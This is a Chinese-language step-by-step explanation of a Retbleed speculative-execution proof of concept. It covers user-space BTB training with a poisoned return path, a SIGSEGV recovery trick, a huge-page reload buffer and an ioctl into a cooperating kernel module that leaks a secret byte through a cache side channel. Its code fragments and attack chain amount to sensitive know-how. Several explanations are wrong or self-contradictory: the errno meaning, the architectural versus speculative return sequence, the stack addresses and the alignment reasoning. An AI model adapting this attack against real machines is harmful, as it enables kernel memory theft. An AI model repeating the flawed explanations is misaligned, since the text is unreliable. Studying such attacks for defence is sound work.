# cp_bti 详细执行分析

## 1. proc_ops 中的函数指针含义

```c
static struct proc_ops pops = {
    .proc_open = nonseekable_open,
    .proc_lseek = no_llseek,
    .proc_ioctl = handle_ioctl,
};
```

**含义解释**：

```
.proc_open = nonseekable_open
├── 函数指针：表示"当用户调用open()时，使用nonseekable_open函数"
├── nonseekable_open 实现：
│   └── 允许打开文件，但禁止 lseek/llseek 操作
│
└── 如果用户调用 open():
    └── 内核调用 pops.proc_open()

.proc_lseek = no_llseek
├── 函数指针：表示"当用户调用lseek()时，返回错误"
├── no_llseek 实现：
│   └── return -ESPIPE (非法seek)
│
└── 如果用户调用 lseek(fd, 0, SEEK_SET):
    └── 内核调用 pops.proc_lseek()
    └── 返回 -ESPIPE (Operation not permitted)

proc_ops 是一个函数指针表，类似于虚函数表
用户进行任何文件操作时，内核会查找并调用对应的函数
```

**对比**：

| 字段 | 含义 | 如果用户调用 | 行为 |
|------|------|-------------|------|
| `proc_open` | 打开时调用 | `open()` | 执行 `nonseekable_open()` |
| `proc_lseek` | seek时调用 | `lseek()` | 执行 `no_lllee()` → 返回错误 |
| `proc_read` | 读取时调用 | `read()` | 如果未定义 → 返回 -EINVAL |
| `proc_ioctl` | ioctl时调用 | `ioctl()` | 执行 `handle_ioctl()` |

---

## 2. ret_path 数组详解

```c
u8* ret_path[RET_PATH_LENGTH + 1] = {0};
#define RET_PATH_LENGTH 30

ret_path[0] = (u8*)sg.kbr_dst;           // disclosure_gadget 地址 (内核)
ret_path[1] = train_space + (sg.kbr_src & HISTORY_MASK);
ret_path[2] = train_space + (sg.kbr_src & HISTORY_MASK);
...
ret_path[30] = train_space + (sg.kbr_src & HISTORY_MASK);
```

**ret_path 数组结构**：

```
ret_path[0]  = 0xffffffffc1799000  (kbr_dst = disclosure_gadget 内核地址)
ret_path[1]  = 0x788888000000 + (kbr_src & 0x1fffff)  (用户态RET地址)
ret_path[2]  = 0x788888000000 + (kbr_src & 0x1fffff)  (同上)
...
ret_path[30] = 0x788888000000 + (kbr_src & 0x1fffff)  (同上)
                    ↑
                    重复30次，指向 train_space 中同一个 RET 指令

栈布局:
┌──────────────────────────────┐
│      ret_path[30] (RET)      │  ← 栈顶 (RSP)
├──────────────────────────────┤
│      ret_path[29] (RET)      │
├──────────────────────────────┤
│           ...                │
├──────────────────────────────┤
│      ret_path[1]  (RET)      │
├──────────────────────────────┤
│ ret_path[0] (disclosure_gadget) │  ← 架构上跳转到这个地址 → SIGSEGV
└──────────────────────────────┘
```

**关键点**：
- `ret_path[1..30]` 都指向 **同一个用户态地址**
- 该地址保存着 `OP_RET` (0xc3)，即一条 `ret` 指令
- `ret_path[0]` 是内核地址

---

## 3. train_space[sg.kbr_src & HISTORY_MASK] = OP_RET

```c
#define OP_RET 0xc3        // ret 指令的机器码

// 只设置一个位置！
train_space[sg.kbr_src & HISTORY_MASK] = OP_RET;
```

**图示**：

```
train_space (2MB 用户空间)
┌─────────────────────────────────────────────────────────┐
│                                                         │
│   train_space + 0       = 0x00... (未使用)              │
│   train_space + 1       = 0x00... (未使用)              │
│   ...                                               │
│   train_space + offset  = 0xc3 (RET 指令)  ← 只设置这里  │
│   ...                                               │
│   train_space + 2MB     = 0x00... (未使用)              │
│                                                         │
└─────────────────────────────────────────────────────────┘
          ↑
   offset = sg.kbr_src & HISTORY_MASK
          = (内核RET地址) & 0x1fffff
```

**为什么只设置一个位置？**

```
目标：让用户态的RET指令地址的低21位
      与内核RET指令地址的低21位相同

原理：
  CPU的RSB/BTB预测只使用返回地址的低位
  (因为其他高位在编译时是固定的)

所以：
  train_space + (kbr_src & MASK)
  = 0x788888000000 + (kbr_src的低21位)
  = 一个用户态地址，其低21位与内核RET相同
```

---

## 4. 为什么 RB_PTR 需要 huge page？

```c
#define RB_PTR 0x3400000
rb_va = mmap_huge(RB_PTR, 1<<21);  // 分配 2MB
rb_pa = va_to_phys(fd_pagemap, RB_PTR);
rb_kva = rb_pa + sg.physmap_base;
```

**目的**：获得 **2MB 物理对齐** 的地址

```
┌────────────────────────────────────────────────────────────────┐
│                    物理地址空间                                 │
├────────────────────────────────────────────────────────────────┤
│                                                                 │
│   RB_PTR 虚拟地址 = 0x3400000                                  │
│        ↓                                                        │
│   通过 pagemap 转换为物理地址                                   │
│        ↓                                                        │
│   rb_pa = 0x25f235000 (假设)                                  │
│        ↓                                                        │
│   rb_kva = rb_pa + physmap_base                               │
│          = 0x25f235000 + 0xffff888000000000                   │
│          = 0xffff88825f235000 (reload buffer 内核地址)         │
│                                                                 │
└────────────────────────────────────────────────────────────────┘
```

**为什么需要 2MB 对齐？**

```
内核的 physmap 区域使用 2MB huge page 映射

physmap_base = 0xffff888000000000 (2MB对齐)

如果 rb_pa 不是 2MB 对齐：
  rb_kva = rb_pa + physmap_base
         = 0x25f235000 + 0xffff888000000000
         = 0xffff88825f235000  ← 这个地址可能不在同一个 2MB 页内

在 disclosure_gadget 中：
  movzb (%rdi), %edi     ; %edi = secret[0]
  shl $12, %rdi          ; %edi = secret[0] * 4096
  movq $2, (%rdi, %rsi)  ; reload_buffer[secret*4096] = 2

  %rdi = secret * 4096  ← 乘以 4096
  %rsi = reload_buffer   ← 需要是 2MB 对齐！

  效果：
    秘密字节 b 决定了访问哪个 4KB 页
    reload_buffer + b*4096 落在不同的 cache line

如果 reload_buffer 没有 2MB 对齐：
  物理上可能分散在多个页
  cache 行为不一致
  侧信道信号减弱
```

**如果没有映射成 huge page 会怎样？**

```
1. 物理地址可能不连续
   → disclosure_gadget 访问的地址跨越页边界
   → 多个页表项参与
   → cache 行为复杂化

2. 侧信道信噪比下降
   → 命中/未命中的时序差异变小
   → 难以区分秘密字节

3. 内核模块计算 rb_kva 可能出错
   → 如果跨页，可能访问非法地址

4. 严重时：
   → POC 成功率从 ~90% 降到 <10%
   → eval_bw 准确率从 ~90% 降到 <1%
```

---

## 5. should_segfault 变量详解

```c
static int should_segfault = 0;

static void handle_segv(int sig, siginfo_t *si, void *unused)
{
    if (should_segfault) {
        siglongjmp(env, 12);  // 跳回 sigsetjmp
        return;
    };

    fprintf(stderr, "Not handling SIGSEGV\n");
    exit(sig);
}

static void setup_segv_handler() {
    struct sigaction sa;
    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    sa.sa_sigaction = &handle_segv;
    sigaction(SIGSEGV, &sa, NULL);
}
```

**should_segfault 的作用**：

```
should_segfault = 0 (默认)
├── ret 触发 SIGSEGV
├── handle_segv() 被调用
├── should_segfault == 0
└── exit(sig) 程序崩溃

should_segfault = 1 (内联汇编期间)
├── ret 触发 SIGSEGV
├── handle_segv() 被调用
├── should_segfault == 1
└── siglongjmp(env, 12) 跳回安全位置

should_segfault = 0 (siglongjmp 之后)
└── 恢复为正常信号处理
```

**为什么需要这个变量？**

```
我们需要 SIGSEGV 来：
1. 停止架构执行 (避免真正崩溃)
2. 从错误位置恢复

但不是所有 SIGSEGV 都应该处理：
- 内联汇编中的 ret → 应该处理
- 其他地方的 sigsegv → 应该崩溃

should_segfault 就是这个开关：
  =1 → 处理 (内联汇编期间)
  =0 → 崩溃 (其他地方)
```

---

## 6. sigsetjmp 参数详解

```c
int a = sigsetjmp(env, 1);    // 保存现场
// ...
if (a == 0) {
    // 内联汇编
}
// ...
siglongjmp(env, 12);         // 恢复现场
```

**sigsetjmp(env, savesigs) 参数**：

| 参数值 | 含义 |
|--------|------|
| `0` | 不保存信号掩码 |
| `1` | 保存当前信号掩码到 `env` |

```
savesigs = 1 时：
├── 当前阻塞的信号被保存到 env
├── siglongjmp 恢复时
│   └── 自动恢复信号掩码
│
└── 目的：确保信号处理不干扰程序流程

savesigs = 0 时：
├── 不保存信号掩码
├── siglongjmp 不恢复信号掩码
│
└── 目的：可能更快，但不安全
```

**siglongjmp(env, val) 参数**：

```
val = 12 (任意非零值)
├── 这个值成为 sigsetjmp 的返回值
├── 用途：区分从哪里返回
│
└── 示例：
    if (sigsetjmp(env, 1) == 0) {
        // 第一次执行到这里
    } else {
        // 从 siglongjmp 返回到这里 (val=12)
    }
```

**完整流程图**：

```
┌──────────────────────────────────────────────────────────────────┐
│                                                                 │
│  should_segfault = 1                                            │
│        │                                                        │
│        ▼                                                        │
│  ┌───────────────────────────────────────────┐                  │
│  │  int a = sigsetjmp(env, 1);              │                  │
│  │  返回值 a = 0                            │                  │
│  │  env 保存当前寄存器状态和信号掩码          │                  │
│  └───────────────────────────────────────────┘                  │
│                    │                                              │
│                    ▼                                              │
│  ┌───────────────────────────────────────────┐                  │
│  │  内联汇编:                                 │                  │
│  │    .rept 31                               │                  │
│  │      pushq (%r10)                         │                  │
│  │      add $8, %%r10                        │                  │
│  │    .endr                                  │                  │
│  │    ret                                    │                  │
│  │                                           │                  │
│  │  ret 指令 → SIGSEGV (架构上)             │                  │
│  └───────────────────────────────────────────┘                  │
│                    │                                              │
│                    ▼                                              │
│  ┌───────────────────────────────────────────┐                  │
│  │  handle_segv() 被调用                      │                  │
│  │    should_segfault == 1                   │                  │
│  │    siglongjmp(env, 12)                    │                  │
│  │      恢复 env 中保存的寄存器               │                  │
│  │      跳回 sigsetjmp 之后的位置             │                  │
│  └───────────────────────────────────────────┘                  │
│                    │                                              │
│                    ▼                                              │
│  ┌───────────────────────────────────────────┐                  │
│  │  should_segfault = 0                     │                  │
│  │  sigsetjmp 返回值 a = 12                 │                  │
│  │  if (a == 0) 不成立，跳过内联汇编          │                  │
│  └───────────────────────────────────────────┘                  │
│                                                                 │
└──────────────────────────────────────────────────────────────────┘
```

---

## 7. 内联汇编执行路径详解

```c
int a = sigsetjmp(env, 1);
if (a == 0) {
    __asm__(
        "mov %[retp], %%r10 \n\t"
        ".rept " xstr(RET_PATH_LENGTH+1) "\n\t"
        "    pushq (%%r10) \n\t"
        "    add $8, %%r10 \n\t"
        ".endr \n\t"
        "    ret \n\t"
        :: [retp]"r"(ret_path) : "rax", "rdi", "r8", "r10"
    );
}
```

**逐行分析**：

```
原始代码:
  ret_path = [
    0: 0xffffffffc1799000  (kbr_dst = disclosure_gadget)
    1: 0x78888800xxxx     (train_space[RET])
    ...
    30: 0x78888800xxxx    (train_space[RET])
  ]

汇编:
  1. mov %[retp], %%r10
     ├── r10 = ret_path 数组地址
     └── 假设 r10 = 0x7fffd1234000
     
  2. .rept 31
     ├── 重复执行以下指令 31 次
     └── 第一次迭代:
     
  3.   pushq (%r10)
     ├── 将 ret_path[0] (0xffffffffc1799000) 压栈
     └── RSP = RSP - 8
     
  4.   add $8, %%r10
     ├── r10 = r10 + 8 (指向下一个指针)
     └── r10 = 0x7fffd1234008
     
     第二次迭代:
  5.   pushq (%r10)
     ├── 将 ret_path[1] (0x78888800xxxx) 压栈
     
  6.   add $8, %%r10
     ├── r10 = 0x7fffd1234010
     
     ... (重复 31 次)

  7.   .endr  (结束重复)

  8.   ret
     ├── 架构上：从栈顶弹出返回地址
     │   └── 弹出 ret_path[30] = 0x78888800xxxx (train_space[RET])
     │
     ├── 投机上：BTB 预测应该跳转到 disclosure_gadget
     │   └── 因为 BTB 被 ret_path[0] 训练过
     │
     ├── 架构执行：
     │   └── 跳转到 0x78888800xxxx (用户态 RET 指令)
     │   └── 正常返回 (SIGSEGV 之前)
     │
     └── 投机执行 (在 SIGSEGV 之前！):
         └── 跳转到 disclosure_gadget (0xffffffffc1799000)
         └── 读取内核秘密数据
         └── 将数据加载到 reload buffer
```

**栈变化过程**：

```
初始 RSP = 0x7fffd1235000

第一次迭代:
  RSP = 0x7fffd1235000 - 8 = 0x7fffd1234ff8
  [0x7fffd1234ff8] = ret_path[0] = 0xffffffffc1799000
  
第二次迭代:
  RSP = 0x7fffd1234ff8 - 8 = 0x7fffd1234ff0
  [0x7fffd1234ff0] = ret_path[1] = 0x78888800xxxx
  ...

31次迭代后 (31个push):
  RSP = 0x7fffd1235000 - 31*8 = 0x7fffd1234ef8
  
栈布局 (低地址在上):
┌─────────────────────────┐ 0x7fffd1234ef8
│   ret_path[30] (RET)    │  ← 栈顶
├─────────────────────────┤
│   ret_path[29] (RET)    │
├─────────────────────────┤
│   ...                   │
├─────────────────────────┤
│   ret_path[1]  (RET)    │
├─────────────────────────┤
│ ret_path[0] (disclosure_gadget) │ ← 架构上弹出这个地址 → SIGSEGV
└─────────────────────────┘ 0x7fffd1234ef8

ret 指令后:
  架构：弹出 0x78888800xxxx → 执行 train_space 中的 RET
        → 继续弹出 0x78888800xxxx ...
        → 最后弹出 0xffffffffc1799000
        → SIGSEGV (访问内核地址)
        
  投机：BTB 预测 ret → disclosure_gadget (0xffffffffc1799000)
        → 执行 disclosure_gadget
        → 秘密数据泄露
```

---

## 8. 为什么 ioctl 触发推测执行

```c
// 用户态
ioctl(fd_spec, REQ_SPECULATE, &p);

// 内核模块
static long handle_ioctl(struct file *filp, unsigned int request, unsigned long argp) {
    if (request == REQ_SPECULATE) {
        copy_from_user(&p, (void *)argp, sizeof(p));
        speculation_primitive(p.secret, p.reload_buffer, 29);  ← 推测执行！
    }
}
```

**完整流程**：

```
┌─────────────────────────────────────────────────────────────────────┐
│                        ioctl 系统调用                                │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  1. 用户态调用 ioctl(fd, REQ_SPECULATE, &p)                         │
│     └── 从用户态切换到内核态 (syscall)                               │
│                                                                      │
│  2. 内核处理 ioctl 请求                                              │
│     └── 查找 /proc/retbleed_poc 的 proc_ops                         │
│     └── 调用 pops.proc_ioctl() = handle_ioctl()                    │
│                                                                      │
│  3. handle_ioctl() 执行                                              │
│     └── 串行化: asm("lfence")                                       │
│     └── 接收参数: copy_from_user(&p, argp)                          │
│     └── 调用 speculation_primitive(p.secret, p.reload_buffer, 29)  │
│                                                                      │
│  4. speculation_primitive() 执行                                   │
│     └── 递归29次                                                     │
│     └── 最后执行 RET 指令                                             │
│                                                                      │
│  5. CPU 投机执行                                                     │
│     └── BTB 预测 RET → disclosure_gadget                             │
│     └── 投机执行 disclosure_gadget                                   │
│     └── 秘密数据 → reload_buffer (cache)                            │
│                                                                      │
│  6. 架构执行返回                                                     │
│     └── speculation_primitive 返回                                  │
│     └── handle_ioctl 返回                                            │
│     └── ioctl 系统调用返回用户态                                      │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘

为什么 ioctl 能触发推测执行？

  ioctl 是一个系统调用，它会：
  1. 从用户态切换到内核态
  2. 在内核态执行任意代码 (这里是 speculation_primitive)
  3. 返回用户态

  speculation_primitive 中的 RET 指令：
  - 架构上：返回到内核中的调用者
  - 投机上：被 BTB 预测跳转到 disclosure_gadget

  disclosure_gadget 在内核模块中，它能访问：
  - 内核地址空间 (包括 secret = random_bytes)
  - 用户提供的 reload_buffer 地址

  所以：
  ioctl → handle_ioctl → speculation_primitive
         → RET → 投机 → disclosure_gadget
         → 读取内核数据 → 泄露到 reload_buffer
         → 侧信道测量
```

---

## 9. 完整攻击链总结

```
┌──────────────────────────────────────────────────────────────────────────┐
│                         Retbleed 攻击完整流程                             │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                           │
│  【阶段1: 初始化】                                                        │
│  ───────────────────                                                     │
│  1. 加载 retbleed_poc.ko 内核模块                                         │
│     └── 模块创建 /proc/retbleed_poc                                       │
│     └── 生成随机 secret (random_bytes)                                    │
│                                                                           │
│  2. cp_bti 用户态程序启动                                                 │
│     └── 打开 /proc/retbleed_poc (fd_spec)                                │
│     └── 打开 /proc/self/pagemap                                           │
│     └── ioctl(fd_spec, REQ_GADGET, &sg)                                  │
│          └── 从内核模块获取: physmap_base, kbr_dst, kbr_src, secret        │
│                                                                           │
│  3. 构造返回路径                                                         │
│     └── ret_path[0] = kbr_dst (内核 disclosure_gadget)                   │
│     └── ret_path[1..30] = train_space[RET] (用户态)                      │
│     └── train_space[RET] = 0xc3 (ret 指令)                               │
│                                                                           │
│  4. 分配 reload buffer                                                   │
│     └── mmap(RB_PTR, 2MB) → 通过 pagemap 获取物理地址                     │
│     └── rb_kva = rb_pa + physmap_base                                     │
│                                                                           │
│  【阶段2: BTB 训练 (用户态)】                                             │
│  ───────────────────────────                                             │
│  5. 触发 SIGSEGV                                                        │
│     └── ret_path 压栈 → ret                                              │
│     └── 架构: SIGSEGV (ret_path[0] 是内核地址)                          │
│     └── 投机: BTB 预测 ret → disclosure_gadget                           │
│                                                                           │
│  【阶段3: 内核推测执行 (ioctl)】                                          │
│  ───────────────────────────                                             │
│  6. ioctl(fd_spec, REQ_SPECULATE, &p)                                   │
│     └── 进入内核态 → handle_ioctl()                                       │
│     └── speculation_primitive(p.secret, p.reload_buffer, 29)               │
│     └── RET 指令                                                         │
│          ├── 架构: 返回内核调用者                                         │
│          └── 投机: BTB 预测 → disclosure_gadget                          │
│                                                                           │
│  7. disclosure_gadget 执行                                                │
│     └── movzb (%rdi), %edi     ; rdi = secret = random_bytes[0] = 6      │
│     └── shl $12, %rdi          ; rdi = 6 * 4096 = 24576                  │
│     └── movq $2, (%rdi, %rsi)  ; reload_buffer[24576] = 2                │
│     └── 效果: reload_buffer[6*4096] 被加载到 cache                        │
│                                                                           │
│  【阶段4: 侧信道测量 (用户态)】                                            │
│  ───────────────────────────                                             │
│  8. reload_range(RB_PTR, 4KB, 16, results)                              │
│     └── 测量 16 个槽位的访问时间                                          │
│     └── results[6]++ (因为槽位 6 在 cache 中)                             │
│                                                                           │
│  【阶段5: 结果推断】                                                      │
│  ────────────────                                                       │
│  9. print_results(results, 16)                                          │
│     └── 输出: "0 0 0 0 0 0 31765 0 0 0 0 0 0 0 0 0"                    │
│     └── 槽位 6 有显著高计数                                               │
│     └── 推断: secret[0] = 6                                               │
│                                                                           │
└──────────────────────────────────────────────────────────────────────────┘
```
